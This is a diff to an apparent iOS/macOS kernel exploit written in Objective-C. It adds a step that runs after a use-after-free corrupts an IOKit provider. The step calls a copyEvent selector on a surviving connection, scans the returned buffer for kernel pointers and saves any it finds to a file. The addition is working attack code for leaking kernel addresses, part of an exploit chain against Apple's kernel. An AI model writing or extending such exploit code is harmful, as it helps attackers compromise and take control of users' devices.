@@ -3930,11 +3930,39 @@ static const char kOpenPropertiesGarbage[] =
         }
     }
 
-    // ---- Release multi-conn client slots before termination race ----
-    // The provider has a maximum client count (~16). The 15 multi-conn connections
-    // from setup are still holding "open" slots. Close them (sel 1) to free slots
-    // for the termination race's probe connections. The IOKit connections stay alive —
-    // the caller re-syncs conn[0] after we return.
+    // ---- Post-UAF kernel address leak probe ----
+    // Provider state is corrupted; copyEvent may leak kernel pointers into our buffer
+    [self appendLog:@"\n====== Post-UAF Kernel Address Probe ======"];
+    int kleakFound = 0;
+    for (int attempt = 0; attempt < 10 && kleakFound == 0; attempt++) {
+        // copyEvent on a surviving connection — may trigger provider to read corrupted state
+        if (connCount > 1) {
+            uint64_t scalars[2] = {0, 1};
+            uint8_t probeBuf[4096];
+            size_t probeSize = sizeof(probeBuf);
+            kern_return_t kr = sIOConnectCallMethod(connections[1], kSelectorCopyEvent,
+                scalars, 2, NULL, 0, NULL, NULL, probeBuf, &probeSize);
+            // Scan for 0xfffffff0XXXXXXXX pattern (real kernel address)
+            for (int off = 0; off + 8 <= 128; off++) {
+                uint64_t val = 0;
+                memcpy(&val, probeBuf + off, sizeof(val));
+                if ((val >> 32) == 0xfffffff0ULL) {
+                    NSString *hexVal = [NSString stringWithFormat:@"0x%016llx", val];
+                    [self appendLog:[NSString stringWithFormat:@"  *** KERNEL ADDR FOUND: offset=%d value=%@", off, hexVal]];
+                    // Write to dedicated file
+                    NSString *kpPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject stringByAppendingPathComponent:@"sword/kaddr.txt"];
+                    [[NSString stringWithFormat:@"0x%016llx offset=%d\n", val, off] writeToFile:kpPath atomically:YES];
+                    kleakFound++;
+                }
+            }
+        }
+        usleep(10000);
+    }
+    if (kleakFound == 0) {
+        [self appendLog:@"  No kernel addresses leaked in post-UAF copyEvent probe."];
+    }
+
+    // ---- Release multi-conn client slots ----
     {
         int released = 0;
         for (int i = 0; i < connCount; i++) {
